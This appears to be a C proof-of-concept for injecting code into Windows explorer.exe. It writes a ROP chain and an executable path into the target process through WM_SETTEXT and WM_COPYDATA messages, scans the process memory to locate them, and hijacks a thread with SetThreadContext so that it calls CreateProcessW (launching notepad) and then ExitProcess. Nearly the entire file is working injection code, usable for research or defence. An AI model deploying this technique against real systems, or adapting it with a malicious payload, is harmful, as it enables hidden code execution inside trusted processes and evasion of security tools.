/*
	PoC code: Inject Explorer.exe process.
	
	APIs used: SendMessage(WM_SETTEXT), SendMessage(WM_COPYDATA), SetThreadContext, OpenProcess, VirtualQueryEx, SuspendThread, ResumeThread, Toolhelp apis.

	This code uses WM_SETTEXT and WM_COPYDATA messages to cause our controlled data to be copied into target process address space.

	In this way, we introduce a very simple ROP to launch notepad with CreateProcess("notepad.exe") and call ExitProcess later.

	We use SetThreadContext to redirect the thread.

	Tests done on platform:

	Windows 10 Pro 64 bits, version 1709 (OS comp. 16299.125).

	Ntdll version 10.0.16299.64.
*/

#define _CRT_SECURE_NO_WARNINGS

#define RESTART_TARGET
#define TARGETPROC "explorer.exe"

#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <Commctrl.h>

/*
ROP1: Piece of code at windows 10 64bits ntdll 10.0.16299.64:

.text:0000000180090D10 58                                            pop     rax
.text:0000000180090D11 5A                                            pop     rdx
.text:0000000180090D12 59                                            pop     rcx
.text:0000000180090D13 41 58                                         pop     r8
.text:0000000180090D15 41 59                                         pop     r9
.text:0000000180090D17 41 5A                                         pop     r10
.text:0000000180090D19 41 5B                                         pop     r11
.text:0000000180090D1B 48 FF E0                                      jmp     rax
*/
#define ROP1 "\x58\x5A\x59\x41\x58\x41\x59\x41\x5A\x41\x5B\x48\xff\xe0"

char MYLOL[0x100];
#define INJPATH "c:\\windows\\system32\\notepad.exe"
#define INJPATHW L"c:\\windows\\system32\\notepad.exe"
ULONG_PTR gc3addr = 0;
ULONG_PTR gloopaddr = 0;
ULONG_PTR ginjectedPathaddr = 0;
ULONG_PTR grop1 = 0;
ULONG_PTR gWritableMemaddr = 0;

HWND hgwnd;
HBITMAP hgbmp;

void DoInjectROP();
void DoInjectPath();

void GenerateSimpleTestROP()
{
	unsigned char * pker = GetModuleHandle("kernel32.dll");
	unsigned char * pntdll = GetModuleHandle("ntdll.dll");
	unsigned char * pcreateproc = GetProcAddress(pker, "CreateProcessW");
	unsigned char * pexitproc = GetProcAddress(pker, "ExitProcess");
	
	ULONG i = 0;
	for (i = 0; i < 0x100000; i++)
	{
		if (pntdll[i] == 0xc3 && !gc3addr)
		{
			gc3addr = &pntdll[i];   //ret
		}

		if (pntdll[i] == 0xeb && pntdll[i + 1] == 0xfe)
		{
			gloopaddr = &pntdll[i]; //infinite loop
		}

		if (!memcmp(&pntdll[i], ROP1, sizeof(ROP1)-1))
		{
			grop1 = &pntdll[i];     //rop1
		}
		
		if (gc3addr && gloopaddr && grop1)break;
	}

	/*
	Calling convention microsoft x64:
	
	Integer arguments are passed in registers RCX, RDX, R8, and R9. Floating point arguments are passed 
	in XMM0L, XMM1L, XMM2L, and XMM3L. 16-byte arguments are passed by reference. Parameter passing is 
	described in detail in Parameter Passing. In addition to these registers, RAX, R10, R11, XMM4, and XMM5 
	are considered volatile. All other registers are non-volatile. Register usage is documented in detail in 
	Register Usage and Caller/Callee Saved Registers.

	The caller is responsible for allocating space for parameters to the callee, and must always allocate 
	sufficient space to store four register parameters, even if the callee doesn’t take that many parameters.


	We will use rop1 to set parameters for CreateProcess. The path of the executable was previously injected with WM_SETTEXT message
	and the address was stored at ginjectedPathaddr:

	.text:0000000180090D10 58                                            pop     rax
	.text:0000000180090D11 5A                                            pop     rdx
	.text:0000000180090D12 59                                            pop     rcx
	.text:0000000180090D13 41 58                                         pop     r8
	.text:0000000180090D15 41 59                                         pop     r9
	.text:0000000180090D17 41 5A                                         pop     r10
	.text:0000000180090D19 41 5B                                         pop     r11
	.text:0000000180090D1B 48 FF E0                                      jmp     rax

	*/
	
	*(ULONG_PTR*)&MYLOL[0 * sizeof(ULONG_PTR)] = (ULONG_PTR)pcreateproc; //pop eax = addr of CreateProcessW (later jmp rax)
	*(ULONG_PTR*)&MYLOL[1 * sizeof(ULONG_PTR)] = 0; //pop edx = lpCommandLine = NULL
	*(ULONG_PTR*)&MYLOL[2 * sizeof(ULONG_PTR)] = ginjectedPathaddr; //pop ecx = lpFile = injectedPath
	*(ULONG_PTR*)&MYLOL[3 * sizeof(ULONG_PTR)] = 0; //pop r8 = process sec attr
	*(ULONG_PTR*)&MYLOL[4 * sizeof(ULONG_PTR)] = 0; //pop r9 = thread sec attr
	*(ULONG_PTR*)&MYLOL[5 * sizeof(ULONG_PTR)] = 0; //pop r10 trash
	*(ULONG_PTR*)&MYLOL[6 * sizeof(ULONG_PTR)] = 0; //pop r11 trash	
	#ifdef RESTART_TARGET
	*(ULONG_PTR*)&MYLOL[7 * sizeof(ULONG_PTR)] = pexitproc; //stack1 = retaddr = ExitProcess (restart target)
	#else
	*(ULONG_PTR*)&MYLOL[7 * sizeof(ULONG_PTR)] = gloopaddr; //stack1 = retaddr = gloopaddr
	#endif
	*(ULONG_PTR*)&MYLOL[8 * sizeof(ULONG_PTR)] = 0; //stack2 = space parameters to the callee
	*(ULONG_PTR*)&MYLOL[9 * sizeof(ULONG_PTR)] = 0; //stack3 = space parameters to the callee
	*(ULONG_PTR*)&MYLOL[10 * sizeof(ULONG_PTR)] = 0; //stack4 = space parameters to the callee
	*(ULONG_PTR*)&MYLOL[11 * sizeof(ULONG_PTR)] = 0; //stack5 = space parameters to the callee
	*(ULONG_PTR*)&MYLOL[12 * sizeof(ULONG_PTR)] = 0; //stack6 = inherit handles
	*(ULONG_PTR*)&MYLOL[13 * sizeof(ULONG_PTR)] = 0; //stack7 = creation flags
	*(ULONG_PTR*)&MYLOL[14 * sizeof(ULONG_PTR)] = 0; //stack8 = pEnvironment
	*(ULONG_PTR*)&MYLOL[15 * sizeof(ULONG_PTR)] = 0; //stack9 = curdir
	*(ULONG_PTR*)&MYLOL[16 * sizeof(ULONG_PTR)] = gWritableMemaddr; //stack10 = out startupinfo
	*(ULONG_PTR*)&MYLOL[17 * sizeof(ULONG_PTR)] = gWritableMemaddr; //stack11 = out procinfo
}

int isZeroMem(char * buf, unsigned int sz)
{
	unsigned int i = 0;
	for (i = 0; i < sz; i++) {
		if (buf[i])return 0;
	}
	return 1;
}

char* stristr(const char* str1, const char* str2)
{
	const char* p1 = str1;
	const char* p2 = str2;
	const char* r = *p2 == 0 ? str1 : 0;

	while (*p1 != 0 && *p2 != 0)
	{
		if (tolower((unsigned char)*p1) == tolower((unsigned char)*p2))
		{
			if (r == 0)
			{
				r = p1;
			}
			p2++;
		}
		else
		{
			p2 = str2;
			if (r != 0)
			{
				p1 = r + 1;
			}
			if (tolower((unsigned char)*p1) == tolower((unsigned char)*p2))
			{
				r = p1;
				p2++;
			}
			else
			{
				r = 0;
			}
		}
		p1++;
	}
	return *p2 == 0 ? (char*)r : 0;
}

int search2(char *text, unsigned int n, char *pat, unsigned int m)
{
	unsigned int i = 0;
	for (i = 0; i + m < n; i++) {
		if (!memcmp(&text[i], pat, m))
			return i;
	}
	return -1;
}

HANDLE GetPidByName(char * name)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	SYSTEM_INFO si;
	DWORD ret=-1;

	GetSystemInfo(&si);

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return(FALSE);
	}

	do
	{
		if (!_strnicmp(pe32.szExeFile, name, strlen(name)))
		{
			ret = pe32.th32ProcessID;
		}

	} while (ret==-1 && Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);

	return ret;
}

VOID SuspendResumeAllThreads(DWORD pid, BOOL suspend)
{
	THREADENTRY32 te32;
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return;

	te32.dwSize = sizeof(THREADENTRY32);

	if (!Thread32First(hProcessSnap, &te32))
	{
		CloseHandle(hProcessSnap);
		return(FALSE);
	}

	do
	{
		if (te32.th32OwnerProcessID == pid)
		{
			HANDLE ret = OpenThread(THREAD_ALL_ACCESS, 0, te32.th32ThreadID);
			if (ret)
			{
				if(suspend)SuspendThread(ret);
				else ResumeThread(ret);
				CloseHandle(ret);
			}
		}

	} while (Thread32Next(hProcessSnap, &te32));

	CloseHandle(hProcessSnap);
}

HANDLE OpenAnyThread(DWORD pid, DWORD * tid, DWORD skip)
{
	HANDLE ret = NULL;
	THREADENTRY32 te32;
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return;

	te32.dwSize = sizeof(THREADENTRY32);

	if (!Thread32First(hProcessSnap, &te32))
	{
		CloseHandle(hProcessSnap);
		return(FALSE);
	}

	do
	{
		if (te32.th32OwnerProcessID == pid)
		{
			if (skip == 0)
			{
				ret = OpenThread(THREAD_ALL_ACCESS, 0, te32.th32ThreadID);
				*tid = te32.th32ThreadID;
				if (ret)break;
			}
			else
			{
				skip--;
			}
		}

		te32.dwSize = sizeof(THREADENTRY32);

	} while (Thread32Next(hProcessSnap, &te32));

	CloseHandle(hProcessSnap);

	return ret;
}

ULONG_PTR GetAnyAlignedWritableZeroMemAddr(DWORD pid, DWORD sz)
{
	ULONG_PTR i = 0;
	ULONG_PTR ret = 0;
	PCHAR lpMem;
	SYSTEM_INFO si;
	MEMORY_BASIC_INFORMATION mbi; 
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	GetSystemInfo(&si);
	PCHAR temp;
	ULONG_PTR ntemp;
	if (hProcess)
	{
		lpMem = 0;
		while (!ret && lpMem < si.lpMaximumApplicationAddress) {
			VirtualQueryEx(hProcess, lpMem, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
			if ((mbi.State&MEM_COMMIT) && mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_EXECUTE_READWRITE)
			{
				temp = malloc(mbi.RegionSize);
				if (temp)
				{
					ntemp = mbi.RegionSize;
					ReadProcessMemory(hProcess, mbi.BaseAddress, temp, mbi.RegionSize, &ntemp);
					for (i = 0; !ret && i < mbi.RegionSize - sz - 1; i++)
					{
						if (!(((ULONG_PTR)(lpMem + i))%8))
						{
							if (isZeroMem(&temp[i], sz))
							{
								ret = lpMem + i;
							}
						}
					}
				}
			}
			lpMem = (PVOID)((ULONG_PTR)mbi.BaseAddress + (ULONG_PTR)mbi.RegionSize);
		}
		CloseHandle(hProcess);
	}
	return ret;
}

unsigned int SearchProcessMemForPattern(char * procnamepattern, char * searchitem, unsigned int searchitemlen, ULONG_PTR * outmatches, unsigned int maxoutmatches, DWORD * outpid)
{
	unsigned int nmatches = 0;
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;
	SYSTEM_INFO si;
	MEMORY_BASIC_INFORMATION mbi;
	PVOID lpMem;
	PVOID temp;
	SIZE_T ntemp;
	FILE * f;
	ULONG_PTR pos;
	BOOL bFound = FALSE;

	GetSystemInfo(&si);

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
		return;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return(FALSE);
	}

	do
	{
		if (!_strnicmp(pe32.szExeFile, procnamepattern, strlen(procnamepattern)))
		{
			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if (hProcess)
			{
				lpMem = 0;
				while (lpMem < si.lpMaximumApplicationAddress) {
					VirtualQueryEx(hProcess, lpMem, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
					if (!(mbi.State&MEM_FREE))
					{
						if (mbi.RegionSize < 0x2000000)
						{
							//Searching new process
							temp = malloc(mbi.RegionSize);
							if (temp)
							{
								ntemp = mbi.RegionSize;
								ReadProcessMemory(hProcess, mbi.BaseAddress, temp, mbi.RegionSize, &ntemp);
								{
									if (-1 != (pos = search2(temp, ntemp, searchitem, searchitemlen))) 
									{
										//Pattern found
										if (nmatches < maxoutmatches)
										{
											bFound = TRUE;
											*outpid = pe32.th32ProcessID;
											outmatches[nmatches] = ((ULONG_PTR)lpMem) + pos;
											nmatches++;
										}
									}
								}
								free(temp);
							}
						}
					}
					lpMem = (PVOID)((ULONG_PTR)mbi.BaseAddress + (ULONG_PTR)mbi.RegionSize);
				}
				CloseHandle(hProcess);
			}
		}

	} while (!bFound && Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);

	return nmatches;
}

VOID SecondStage()
{
	ULONG_PTR outmatches[100];
	ULONG_PTR outmatchespaths[100];
	unsigned int nmatches;
	unsigned int nmatchespaths;
	unsigned int i = 0;
	DWORD pid = 0;
	DWORD pid2 = 0;
	HANDLE hProc;
	ULONG_PTR ntemp;
	CHAR temp[0x200];
	ULONG_PTR ntemp2;
	CHAR temp2[0x200];
	BOOL bgood = FALSE;

	//Inject notepad.exe full path with WM_SETTEXT
	DoInjectPath();

	//Search the address of the injected path in the target process address space
	nmatchespaths = SearchProcessMemForPattern(TARGETPROC, INJPATHW, sizeof(INJPATHW) - 2, outmatchespaths, 100, &pid);	

	//Sometimes, the memory found that is containing the path, is not very stable and notepad path is there temporarily 
	//(i.e. stack that contained the string, but it was cleared later, etc...)
	//For this reason, after getting addresses containing the path, we will inject the rop string, and we will check
	//if both (the rop string and the path) are still there. If not, we try with another pair.
	for (i = 0; i < nmatchespaths; i++) {
		ginjectedPathaddr = outmatchespaths[i];
		gWritableMemaddr = GetAnyAlignedWritableZeroMemAddr(pid, sizeof(STARTUPINFOW));
		GenerateSimpleTestROP();
		DoInjectROP();
		nmatches = SearchProcessMemForPattern(TARGETPROC, MYLOL, sizeof(MYLOL), outmatches, 100, &pid);
		Sleep(3000); //sleep a time to recheck the strings in the target process (to be a bit more sure they are not temporary trash)
		hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		if (hProc)
		{
			//re-check our strings are still there
			memset(temp, 0, 0x200);
			memset(temp2, 0, 0x200);
			ReadProcessMemory(hProc, outmatches[i], temp, sizeof(MYLOL), &ntemp);
			ReadProcessMemory(hProc, outmatchespaths[i], temp2, sizeof(INJPATHW), &ntemp2);
			if (!memcmp(temp, MYLOL, sizeof(MYLOL)) &&
				!memcmp(temp2, INJPATHW, sizeof(INJPATHW) - 2))
			{
				bgood = TRUE;
				break;
			}
			CloseHandle(hProc);
		}
	}

	if (!bgood)
	{
		MessageBox(0, "Bad luck", "Bad luck", 0);
		return;
	}

	//We have our controlled data there into the target process address space, lets redirect a thread
	SuspendResumeAllThreads(GetPidByName(TARGETPROC), 1);
	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProc)
	{
		for (i = nmatches - 1; ; i--)
		{
			DWORD tid;
			HANDLE t = NULL;
			t = OpenAnyThread(pid, &tid, 0);
			if (t)
			{
				CONTEXT c;
				SuspendThread(t);
				c.ContextFlags = CONTEXT_ALL;
				GetThreadContext(t, &c);
				c.ContextFlags = CONTEXT_ALL;
				c.Rsp = outmatches[i]; //rop
				c.Rip = grop1; //ntdll code to start execution
				SetThreadContext(t, &c);
				ResumeThread(t); SuspendResumeAllThreads(pid, 0);
				ResumeThread(t); SuspendResumeAllThreads(pid, 0);
				ResumeThread(t); SuspendResumeAllThreads(pid, 0);
				ResumeThread(t); SuspendResumeAllThreads(pid, 0);
				ResumeThread(t); SuspendResumeAllThreads(pid, 0);
				ResumeThread(t); SuspendResumeAllThreads(pid, 0);
				ResumeThread(t); SuspendResumeAllThreads(pid, 0);
				ResumeThread(t); SuspendResumeAllThreads(pid, 0);
				ResumeThread(t); SuspendResumeAllThreads(pid, 0);
				ResumeThread(t); SuspendResumeAllThreads(pid, 0);
				ResumeThread(t); SuspendResumeAllThreads(pid, 0);
				ResumeThread(t); SuspendResumeAllThreads(pid, 0);
				i = 0;
			}

			if (i == 0)break;
		}

		CloseHandle(hProc);
	}
}

BOOL CALLBACK EnumWindowsProcCopyData(HWND hWnd, long lParam) {
	
	int v;
	TCHAR buf[4096];
	FILE * f;
	DWORD pid;

	int z = GetWindowTextA(hWnd, buf, 4096);

	GetWindowThreadProcessId(hWnd, &pid);
	HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	
	if (h)
	{
		char fname[MAX_PATH];
		
		if (GetProcessImageFileName(h, fname, MAX_PATH) && stristr(fname, TARGETPROC))
		{
			ULONG i;

			for (v = 0; v < 0x500; v++)
			{
				COPYDATASTRUCT CDS;
				CDS.dwData = v;
				CDS.cbData = sizeof(MYLOL);
				CDS.lpData = MYLOL;
				if (SendMessage(hWnd, WM_COPYDATA, (WPARAM)hgwnd, (LPARAM)(LPVOID)&CDS))
				{
					v = v;
				}
			}
		}

		CloseHandle(h);

		EnumChildWindows(hWnd, EnumWindowsProcCopyData, NULL);

		return TRUE;
	}
}

BOOL CALLBACK EnumWindowsProcSetText(HWND hWnd, long lParam) {

	int v;
	TCHAR buf[4096];
	FILE * f;
	DWORD pid;

	int z = GetWindowTextA(hWnd, buf, 4096);

	GetWindowThreadProcessId(hWnd, &pid);
	HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);

	if (h)
	{
		char fname[MAX_PATH];

		if (GetProcessImageFileName(h, fname, MAX_PATH) && stristr(fname, TARGETPROC))
		{
			ULONG i;

			{
				SendMessageA(hWnd, WM_SETTEXT, 0, (LPARAM)INJPATH);
			}
		}

		CloseHandle(h);

		EnumChildWindows(hWnd, EnumWindowsProcSetText, NULL);

		return TRUE;
	}
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{

	switch (message)
	{
	case WM_CLOSE:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;

}

void DoInjectPath()
{
	EnumChildWindows(NULL, EnumWindowsProcSetText, 0);
}

void DoInjectROP()
{
	EnumChildWindows(NULL, EnumWindowsProcCopyData, 0);
}

int WinMain(int a, int b, int c, int d) {
	
	HINSTANCE hInstance = NULL;
	WNDCLASS wc = { 0 };
	FILE * f;
	DWORD r;

	unsigned int nmatchespaths;
	ULONG_PTR outmatchespaths[100];
	DWORD pid;

	wc.lpfnWndProc = WndProc;
	wc.hInstance = hInstance;
	wc.hbrBackground = (HBRUSH)(COLOR_BACKGROUND);
	wc.lpszClassName = L"lololo";

	if (RegisterClass(&wc))
	{
		hgwnd = CreateWindow(wc.lpszClassName,
			L"LOLOLO APP",
			WS_OVERLAPPEDWINDOW | WS_VISIBLE,
			0, 0, 2, 2, 0, 0, hInstance, NULL);
	}
	
	SecondStage();

	return 0;
}